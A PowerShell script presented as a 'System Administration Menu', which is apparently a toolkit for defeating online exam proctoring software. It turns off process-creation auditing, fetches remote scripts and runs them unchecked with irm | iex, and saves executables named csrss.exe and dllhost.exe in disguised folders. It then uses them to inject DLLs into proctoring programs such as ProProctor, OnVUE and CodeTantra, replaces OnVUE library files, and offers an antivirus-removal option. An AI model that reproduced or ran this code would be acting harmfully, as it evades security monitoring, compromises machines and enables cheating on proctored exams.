# ============================================================
# System Administration Menu
# ============================================================

auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /f

$Host.UI.RawUI.WindowTitle = "System Administration Menu"

function Show-Menu {
    Clear-Host

    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "       SYSTEM ADMINISTRATION MENU" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "1 - INSTALLATION ALL SERVERS"
    Write-Host "2 - SYSTEM CHECK"
    Write-Host "3 - ONLY DW AND MESH UNINSTALL"
    Write-Host "4 - ONVUE"
    Write-Host "5 - PSI"
    Write-Host "6 - PROMETRIC AND PROPROCTOR"
    Write-Host "7 - UNINSTALL ANTIVIRUS"
    Write-Host "8 - END TASK"
    Write-Host "9 - EXIT"
    Write-Host ""
}

function Pause-Menu {
    Write-Host ""
    Read-Host "Press Enter to return to the menu"
}

while ($true) {

    Show-Menu

    $Choice = Read-Host "Select an option"

    switch ($Choice) {

        "1" {
            Clear-Host
            Write-Host "INSTALLATION ALL SERVERS" -ForegroundColor Green
            Write-Host ""
            
            # Put your approved installation command here.
			powershell -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/hari98486/systemcheck/main/install.ps1' | iex"


            Pause-Menu
        }

        "2" {
            Clear-Host
            Write-Host "SYSTEM CHECK" -ForegroundColor Green
            Write-Host ""

			powershell -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/hari98486/systemcheck/main/systemcheck.ps1' | iex"

            Pause-Menu
        }

        "3" {
            Clear-Host
            Write-Host "ONLY DW AND MESH UNINSTALL" -ForegroundColor Green
            Write-Host ""
			cd c:/
curl.exe -L -o C:\DW.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/DW.exe"
C:\bhavani.exe -fulluninstall
C:\remotezone.exe -fulluninstall
C:\HANUMAN64.exe -fulluninstall
C:\jai.exe -fulluninstall

            Pause-Menu
        }

        "4" {
            Clear-Host
            Write-Host "ONVUE" -ForegroundColor Green
            Write-Host ""
			
$SourceUrl = "https://raw.githubusercontent.com/hari984/11111/main/BLNative.dll"
$SourceFile = "C:\Temp\BLNative.dll"

New-Item -Path "C:\Temp" -ItemType Directory -Force | Out-Null

Invoke-WebRequest -Uri $SourceUrl -OutFile $SourceFile

Get-ChildItem "C:\Users" -Directory | ForEach-Object {

    $TargetFile = Join-Path $_.FullName "AppData\Roaming\OnVUE\BLNative.dll"

    if (Test-Path -LiteralPath $TargetFile) {
        Copy-Item -LiteralPath $SourceFile -Destination $TargetFile -Force
        Write-Host "Replaced: $TargetFile" -ForegroundColor Green
    }
}

# Delete temporary downloaded file
if (Test-Path -LiteralPath $SourceFile) {
    Remove-Item -LiteralPath $SourceFile -Force
    Write-Host "Temporary file deleted." -ForegroundColor Green
}

            Pause-Menu
        }

        "5" {
            Clear-Host
            Write-Host "PSI" -ForegroundColor Green
            Write-Host ""

            curl -L -o "C:\Windows\System32\isp.bat" "https://raw.githubusercontent.com/hari98486/fff/main/isp.bat"
            C:\WINDOWS\system32\cmd.exe  /K isp.bat

            Pause-Menu
        }

        "6" {
            Clear-Host
            Write-Host "PROMETRIC AND PROPROCTOR" -ForegroundColor Green
            Write-Host ""

            
curl -L -o "C:\Program Files (x86)\WindowsPowerShell\Modules\PowerShellGet\1.0.0.1\en-US\dllhost.exe" "https://raw.githubusercontent.com/hari98486/fff/main/dllhost.exe"

curl -L -o "C:\Program Files (x86)\WindowsPowerShell\Modules\PowerShellGet\1.0.0.1\en-US\csrss.exe" "https://raw.githubusercontent.com/hari98486/fff/main/csrss.exe"

curl -L -o "C:\Program Files (x86)\Windows Media Player\Skins\csrss.dll" "https://raw.githubusercontent.com/hari98486/fff/main/csrss.dll"

curl -L -o "C:\Program Files (x86)\Windows Media Player\Skins\dllhost.dll" "https://raw.githubusercontent.com/hari98486/fff/main/dllhost.dll"

curl -L "https://raw.githubusercontent.com/hari98486/fff/main/one.dll" -o "C:\Program Files (x86)\Windows Media Player\Skins\one.dll"

cd C:\Program Files (x86)\WindowsPowerShell\Modules\PowerShellGet\1.0.0.1\en-US\

csrss.exe "C:\Program Files (x86)\WindowsPowerShell\Modules\PowerShellGet\one.dll" "proproctor.exe"

csrss.exe "C:\Program Files (x86)\WindowsPowerShell\Modules\PowerShellGet\one.dll" "Secure Companion App.exe"

csrss.exe "C:\Program Files (x86)\Windows Media Player\Skins\csrss.dll" "Secure Companion App.exe"

dllhost.exe "C:\Program Files (x86)\Windows Media Player\Skins\dllhost.dll" "Secure Companion App.exe"

csrss.exe "C:\Program Files (x86)\WindowsPowerShell\Modules\PowerShellGet\one.dll" "proproctor.exe"

dllhost.exe "C:\Program Files (x86)\Windows Media Player\Skins\dllhost.dll" "CodeTantra SEA.exe"

dllhost.exe "C:\Program Files (x86)\Windows Media Player\Skins\dllhost.dll" "CodeTantra-SEA.exe"

csrss.exe "C:\Program Files (x86)\Windows Media Player\Skins\csrss.dll" "CodeTantra-SEA.exe"

csrss.exe "C:\Program Files (x86)\Windows Media Player\Skins\csrss.dll" "CodeTantra SEA.exe"

dllhost.exe "C:\Program Files (x86)\Windows Media Player\Skins\dllhost.dll" "codetantra sea.exe"

csrss.exe "C:\Program Files (x86)\Windows Media Player\Skins\csrss.dll" "codetantra sea.exe"

csrss.exe "C:\Program Files (x86)\Windows Media Player\Skins\csrss.dll" "proctorfree.exe"

dllhost.exe "C:\Program Files (x86)\Windows Media Player\Skins\dllhost.dll" "proctorfree.exe"

csrss.exe "C:\Program Files (x86)\Windows Media Player\Skins\csrss.dll" "questionmark secure for windows desktop.exe"

csrss.exe "C:\Program Files (x86)\Windows Media Player\Skins\csrss.dll" "sb.exe"

dllhost.exe "C:\Program Files (x86)\Windows Media Player\Skins\dllhost.dll" "Talview Secure Browser.exe"

csrss.exe "C:\Program Files (x86)\WindowsPowerShell\Modules\PowerShellGet\one.dll" "proproctor.exe"

            Pause-Menu
        }

        "7" {
            Clear-Host
            Write-Host "UNINSTALL ANTIVIRUS" -ForegroundColor Green
            Write-Host ""

            powershell -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/hari98486/systemcheck/main/uninstallanti.ps1' | iex"

            Pause-Menu
        }

        "8" {
            Clear-Host
            Write-Host "END TASK" -ForegroundColor Green
            Write-Host ""

            powershell -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/hari98486/systemcheck/main/endtask.ps1' | iex"

            Pause-Menu
        }

        "9" {
            Clear-Host
            Write-Host "Exiting..." -ForegroundColor Yellow
            break
        }

        default {
            Write-Host ""
            Write-Host "Invalid option. Please select 1-9." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
}